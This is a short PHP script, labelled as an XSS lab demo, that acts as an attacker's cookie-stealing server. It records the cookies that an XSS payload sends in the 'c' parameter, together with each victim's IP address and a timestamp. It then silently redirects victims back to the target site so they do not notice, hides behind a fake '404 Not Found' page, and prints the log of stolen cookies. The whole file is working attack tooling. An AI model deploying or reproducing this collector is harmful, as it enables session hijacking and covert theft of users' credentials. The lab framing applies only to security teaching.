<?php
// ⚠️  ATTACKER'S COOKIE STEALER - XSS Lab Demo
// Deploy this on a SEPARATE server (attacker machine / Kali)
// The victim's browser will be redirected here by the XSS payload

$log_file = "stolen_cookies.txt";

if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip     = $_SERVER['REMOTE_ADDR'];
    $time   = date('Y-m-d H:i:s');

    $entry = "[$time] IP: $ip | Cookie: $cookie\n";
    file_put_contents($log_file, $entry, FILE_APPEND);

    // Silently redirect victim back so they don't notice
    header("Location: http://VICTIM_SITE/dashboard.php");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>

<?php
// Show stolen cookies (for demo only)
if (file_exists($log_file)) {
    echo "<hr><h3>Stolen Cookies Log:</h3><pre>";
    echo htmlspecialchars(file_get_contents($log_file));
    echo "</pre>";
}
?>
</body>
</html>
